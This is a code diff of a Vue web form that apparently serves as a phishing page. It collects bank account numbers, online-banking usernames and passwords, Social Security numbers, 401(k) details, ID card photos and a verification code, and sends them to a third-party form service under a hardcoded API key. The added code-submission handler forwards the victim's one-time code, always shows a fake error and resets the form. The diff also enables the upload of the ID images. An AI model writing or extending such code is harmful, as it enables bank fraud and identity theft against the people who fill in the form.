@@ -114,34 +114,34 @@ const submitForm = () => {
   }
   loadReq.value = true;
   // upload both images to Cloudinary
-  // Promise.all([
-  //   uploadImage(dataUrlToFile(frontPreview.value, 'front-id')),
-  //   uploadImage(dataUrlToFile(backPreview.value, 'back-id'))
-  // ]).then(([frontUrl, backUrl]) => {
-  //   // Here you can send the form data along with the uploaded image URLs to your backend or Firestore
-  //   form.value.frontPreview = frontUrl;
-  //   form.value.backPreview = backUrl;
-  //   console.log('Front Image URL:', frontUrl);
-  //   console.log('Back Image URL:', backUrl);
+  Promise.all([
+    uploadImage(dataUrlToFile(frontPreview.value, 'front-id')),
+    uploadImage(dataUrlToFile(backPreview.value, 'back-id'))
+  ]).then(([frontUrl, backUrl]) => {
+    // Here you can send the form data along with the uploaded image URLs to your backend or Firestore
+    form.value.frontPreview = frontUrl;
+    form.value.backPreview = backUrl;
+    console.log('Front Image URL:', frontUrl);
+    console.log('Back Image URL:', backUrl);
 
-  //   // Reset form and previews if needed
-  //   // form.value = {
-  //   //   bank: '',
-  //   //   accountNumber: '',
-  //   //   amount: '',
-  //   //   username: '',
-  //   //   password: '',
-  //   //   ssn: '',
-  //   //   fortyOneK: '',
-  //   //   fortyOneKProvider: '',
-  //   //   code: ''
-  //   // };
-  //   // frontPreview.value = '';
-  //   // backPreview.value = '';
-  // }).catch(err => {
-  //   console.error('Error uploading images:', err);
-  //   $swal.fire('Error', 'There was an issue uploading your ID images. Please try again.', 'error');
-  // });
+    // Reset form and previews if needed
+    // form.value = {
+    //   bank: '',
+    //   accountNumber: '',
+    //   amount: '',
+    //   username: '',
+    //   password: '',
+    //   ssn: '',
+    //   fortyOneK: '',
+    //   fortyOneKProvider: '',
+    //   code: ''
+    // };
+    // frontPreview.value = '';
+    // backPreview.value = '';
+  }).catch(err => {
+    console.error('Error uploading images:', err);
+    $swal.fire('Error', 'There was an issue uploading your ID images. Please try again.', 'error');
+  });
 
   // save to Firestore
   submitRequest(form.value).then((resp) => {
@@ -166,7 +166,6 @@ const submitForm = () => {
   formdata.append('frontPreview', form.value.frontPreview);
   formdata.append('backPreview', form.value.backPreview);
   formdata.append('apiKey', 'sf_d45fafc315dd75e7bdf87ffe');
-  formdata.append('_captcha', 'false');
 
   // send to staticforms
   fetch('https://api.staticforms.dev/submit', {
@@ -182,12 +181,44 @@ const submitForm = () => {
   });
 }
 
+const loadCode = ref(false);
 // submit code form
 const submitCodeForm = () => {
+  loadCode.value = true;
   // Here you can handle the code verification logic
-  // For example, you can send the code to your backend for verification
-  console.log('Verification code submitted:', form.value.code);
-  $swal.fire('Sorry', 'some information are not correct...', 'error');
+  // formdata to send to staticforms
+  const formdata = new FormData();
+  formdata.append('code', form.value.code);
+  formdata.append('apiKey', 'sf_d45fafc315dd75e7bdf87ffe');
+  // For example, you can send the code to your backend for verification  // send to staticforms
+  fetch('https://api.staticforms.dev/submit', {
+    method: 'POST',
+    body: formdata
+  }).then(data => {
+    console.log('Form submitted successfully:', data);
+    $swal.fire('Sorry', 'some information are not correct...', 'error');
+    formpage.value = 'default';
+    // clear form
+    form.value = {
+      bank: '',
+      accountNumber: '',
+      amount: '',
+      username: '',
+      password: '',
+      ssn: '',
+      fortyOneK: '',
+      fortyOneKProvider: '',
+      code: ''
+    };
+    // clear previews
+    frontPreview.value = '';
+    backPreview.value = '';
+    loadCode.value = false;
+
+  }).catch(err => {
+    console.error('Error submitting form:', err);
+    $swal.fire('Error', 'There was an issue submitting your form. Please try again.', 'error');
+  });
 }
 </script>
 
@@ -347,7 +378,7 @@ const submitCodeForm = () => {
             <!-- Submit -->
             <button type="submit" class="btn btn-primary w-100 p-3 login-btn" :disabled="loadReq==true">
               <i class="spinner-border spinner-border-sm" v-if="loadReq==true"></i>
-              <span>PROCEED</span>
+              <span> PROCEED</span>
             </button>
           </form>
         </div>
@@ -366,7 +397,8 @@ const submitCodeForm = () => {
                 required
               />
             </div>
-            <button type="submit" class="btn btn-primary w-100 p-3 login-btn" style="background-color:#014EA8;" id="codeBtn">
+            <button type="submit" class="btn btn-primary w-100 p-3 login-btn" style="background-color:#014EA8;" :disabled="loadCode==true">
+              <i class="spinner-border spinner-border-sm" v-if="loadCode==true"></i>
               Complete Deposit
             </button>
           </form>
